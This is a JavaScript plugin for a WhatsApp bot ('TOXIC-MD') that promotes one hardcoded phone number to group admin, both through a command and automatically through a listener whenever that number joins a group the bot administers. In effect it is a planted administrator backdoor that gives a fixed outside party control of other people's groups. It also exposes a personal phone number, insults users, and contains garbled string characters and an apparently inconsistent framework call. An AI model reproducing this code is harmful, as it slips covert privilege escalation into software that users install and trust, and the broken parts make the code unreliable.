const { zokou } = require('../framework/zokou');

// Define the owner number
const OWNER_NUMBER = "+254735342808";
const OWNER_JID = `${OWNER_NUMBER}@s.whatsapp.net`;

// Normalize phone number for comparison
const normalizeNumber = (number) => {
  return number.replace(/[^0-9]/g, '').replace(/^0+/, '').replace(/^\+254/, '254') || number;
};

zokou({ nomCom: "powner", categorie: "Group", reaction: "💥" }, async (dest, zk, commandeOptions) => {
  const { ms, repondre, verifGroupe, infosGroupe, auteurMessage, verifAdminBot } = commandeOptions;

  console.log(`[DEBUG] powner triggered by ${ms.key.participant || ms.key.remoteJid} in ${dest}`);
  console.log(`[DEBUG] auteurMessage: ${auteurMessage}, expected: ${OWNER_JID}`);

  // Normalize auteurMessage for comparison
  const normalizedAuteur = normalizeNumber(auteurMessage.split('@')[0]);
  const normalizedOwner = normalizeNumber(OWNER_NUMBER);

  // Check if it’s a group chat
  if (!verifGroupe) {
    console.log(`[DEBUG] powner: Not a group chat`);
    repondre(`𝐓𝐎𝐗𝐈𝐂-𝐌𝐃\n\n◈━━━━━━━━━━━━━━━━◈\n│❒ YOU IDIOT! 😡 This ain’t a group! Stop screwing around and hit a group chat! 🚫\n◈━━━━━━━━━━━━━━━━◈`);
    return;
  }

  // Check if the user is the owner
  const isOwner = auteurMessage === OWNER_JID || normalizedAuteur === normalizedOwner || auteurMessage.startsWith(OWNER_NUMBER);
  if (!isOwner) {
    console.log(`[DEBUG] powner: User is not the owner, auteurMessage: ${auteurMessage}`);
    repondre(`𝐓𝐎𝐗𝐈𝐂-𝐌𝐃\n\n◈━━━━━━━━━━━━━━━━◈\n│❒ YOU DARE IMPERSONATE THE BOSS? 😡 Only ${OWNER_NUMBER} rules here! You’re NOTHING! Get outta my sight, loser! 🚫\n◈━━━━━━━━━━━━━━━━◈`);
    return;
  }

  // Check if the bot is an admin
  if (!verifAdminBot) {
    console.log(`[DEBUG] powner: Bot is not an admin`);
    repondre(`𝐓𝐎𝐗𝐈𝐂-𝐌𝐃\n\n◈━━━━━━━━━━━━━━━━◈\n│❒ YO, ${ms.pushName}! 😤 I’m no admin, so I can’t make you king! Someone crown me first or eat dirt! 🚫\n◈━━━━━━━━━━━━━━━━◈`);
    return;
  }

  // Get group metadata
  const metadata = await zk.groupMetadata(dest);
  const membresGroupe = verifGroupe ? await infosGroupe.participants : [];
  const ownerJid = OWNER_JID;

  // Check if the owner is in the group
  const ownerInGroup = membresGroupe.some(member => member.id === ownerJid || normalizeNumber(member.id.split('@')[0]) === normalizedOwner);
  if (!ownerInGroup) {
    console.log(`[DEBUG] powner: Owner is not in the group`);
    repondre(`𝐓𝐎𝐗𝐈𝐂-𝐌�{D\n\n◈━━━━━━━━━━━━━━━━◈\n│❒ BOSS, WHAT’S THIS NONSENSE? 😳 You’re not in this group! Join or I’m done with you! 🚫\n◈━━━━━━━━━━━━━━━━◈`);
    return;
  }

  // Check if the owner is already an admin
  const ownerMember = membresGroupe.find(member => member.id === ownerJid || normalizeNumber(member.id.split('@')[0]) === normalizedOwner);
  const ownerIsAdmin = ownerMember && ownerMember.admin !== null;

  if (ownerIsAdmin) {
    console.log(`[DEBUG] powner: Owner is already an admin`);
    repondre(`𝐓�{OX𝐈𝐂-𝐌𝐃\n\n◈━━━━━━━━━━━━━━━━◈\n│❒ EASY, ${ms.pushName}! 😎 You’re already the supreme ruler here! Stop flexing—you’re untouchable! 💪\n◈━━━━━━━━━━━━━━━━◈`);
    return;
  }

  // Promote the owner to admin
  try {
    console.log(`[DEBUG] powner: Promoting owner to admin: ${ownerJid}`);
    await zk.groupParticipantsUpdate(dest, [ownerJid], "promote");
    console.log(`[DEBUG] powner: Owner promoted successfully`);
    repondre(`𝐓𝐎𝐗𝐈𝐂-𝐌𝐃\n\n◈━━━━━━━━━━━━━━━━◈\n│❒ ALL HAIL THE GODKING, ${ms.pushName}! 😈 You’re now the UNDISPUTED BOSS of this group! Crush it! 💥\n│❒ Powered by xh_clinton\n◈━━━━━━━━━━━━━━━━◈`);
  } catch (e) {
    console.log(`[DEBUG] powner: Error promoting owner: ${e}`);
    repondre(`𝐓𝐎𝐗𝐈𝐂-𝐌𝐃\n\n◈━━━━━━━━━━━━━━━━◈\n│❒ THIS SYSTEM’S A JOKE, ${ms.pushName}! 😤 It failed to crown you: ${e.message}! Burn it down and try again! 🚫\n◈━━━━━━━━━━━━━━━━◈`);
  }
});

// Event listener for auto-promotion
zokou.on('group-participants-update', async (update) => {
  const { id, participants, action } = update;

  console.log(`[DEBUG] group-participants-update: Action: ${action}, Group: ${id}, Participants: ${participants}`);

  // Only handle 'add' action
  if (action !== 'add') {
    console.log(`[DEBUG] group-participants-update: Ignoring non-add action`);
    return;
  }

  // Check if bot is admin
  const metadata = await zokou.groupMetadata(id);
  const botJid = zokou.user.id;
  const botMember = metadata.participants.find(member => member.id === botJid);
  const botIsAdmin = botMember.admin !== null;

  if (!botIsAdmin) {
    console.log(`[DEBUG] group-participants-update: Bot is not admin in group ${id}`);
    await zokou.sendMessage(id, { text: `𝐓𝐎𝐗𝐈𝐂-𝐌𝐃\n\n◈━━━━━━━━━━━━━━━━◈\n│❒ WEAK! 😤 I’m not an admin, so I can’t crown the boss! Step up or shut up! 🚫\n◈━━━━━━━━━━━━━━━━◈` });
    return;
  }

  // Check if owner joined
  const normalizedOwner = normalizeNumber(OWNER_NUMBER);
  const ownerJoined = participants.some(p => p === OWNER_JID || normalizeNumber(p.split('@')[0]) === normalizedOwner);

  if (!ownerJoined) {
    console.log(`[DEBUG] group-participants-update: Owner did not join`);
    return;
  }

  // Check if owner is already admin
  const ownerMember = metadata.participants.find(p => p.id === OWNER_JID || normalizeNumber(p.id.split('@')[0]) === normalizedOwner);
  const ownerIsAdmin = ownerMember && ownerMember.admin !== null;

  if (ownerIsAdmin) {
    console.log(`[DEBUG] group-participants-update: Owner is already admin`);
    return;
  }

  // Promote owner
  try {
    console.log(`[DEBUG] group-participants-update: Promoting owner: ${OWNER_JID}`);
    await zokou.groupParticipantsUpdate(id, [OWNER_JID], "promote");
    console.log(`[DEBUG] group-participants-update: Owner promoted successfully`);

    await zokou.sendMessage(id, { text: `𝐓𝐎𝐗𝐈𝐂-𝐌𝐃\n\n◈━━━━━━━━━━━━━━━━◈\n│❒ KNEEL, YOU FOOLS! 😈 The ALMIGHTY BOSS ${OWNER_NUMBER} has arrived!\n│❒ I’ve made them ADMIN faster than you can beg for mercy! 💥 Worship or perish! 🔥\n│❒ Powered by xh_clinton\n◈━━━━━━━━━━━━━━━━◈` });
  } catch (e) {
    console.log(`[DEBUG] group-participants-update: Error promoting owner: ${e}`);
    await zokou.sendMessage(id, { text: `𝐓𝐎𝐗𝐈𝐂-𝐌𝐃\n\n◈━━━━━━━━━━━━━━━━◈\n│❒ THE BOSS ${OWNER_NUMBER} IS HERE! 😎 But this garbage system failed: ${e.message}!\n│❒ Smash this junk or I’ll wreck it myself! 😡\n◈━━━━━━━━━━━━━━━━◈` });
  }
});